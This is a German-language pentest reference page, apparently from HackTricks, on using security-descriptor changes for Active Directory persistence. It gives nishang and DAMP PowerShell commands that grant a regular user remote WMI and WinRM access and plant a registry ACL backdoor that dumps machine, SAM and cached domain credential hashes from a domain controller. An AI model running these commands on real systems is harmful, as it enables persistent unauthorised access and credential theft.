# Sicherheitsdeskriptoren

{{#include ../../banners/hacktricks-training.md}}

## Sicherheitsdeskriptoren

[Aus der Dokumentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Die Security Descriptor Definition Language (SDDL) definiert das Format, das zur Beschreibung eines Sicherheitsdeskriptors verwendet wird. SDDL verwendet ACE-Strings für DACL und SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Die **Sicherheitsdeskriptoren** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** **über** ein **Objekt** hat. Wenn du nur eine **kleine Änderung** am **Sicherheitsdeskriptor** eines Objekts **vornehmen** kannst, kannst du sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.

Diese Persistenztechnik basiert also auf der Fähigkeit, jede benötigte Berechtigung für bestimmte Objekte zu erlangen, um eine Aufgabe ausführen zu können, die normalerweise Administratorberechtigungen erfordert, ohne selbst Administrator sein zu müssen.

### Zugriff auf WMI

Du kannst einem Benutzer Zugriff gewähren, **WMI remote auszuführen**, [**indem du dies verwendest**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Zugriff auf WinRM

Gewähre einem Benutzer Zugriff auf die **winrm PS console** [**mithilfe dieses Skripts**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access auf Hashes

Greife auf die **registry** zu und **dump hashes**, indem du eine **Reg backdoor mit** [**DAMP**](https://github.com/HarmJ0y/DAMP)** erstellst,** sodass du jederzeit den **hash des Computers**, die **SAM** und alle **cached AD**-Credentials auf dem Computer abrufen kannst. Daher ist es sehr nützlich, einem **regular user** diese Berechtigung für einen **Domain Controller** zu erteilen:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Siehe [**Silver Tickets**](silver-ticket.md), um zu erfahren, wie du den Hash des Computerkontos eines Domain Controllers verwenden könntest.

## Referenzen

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
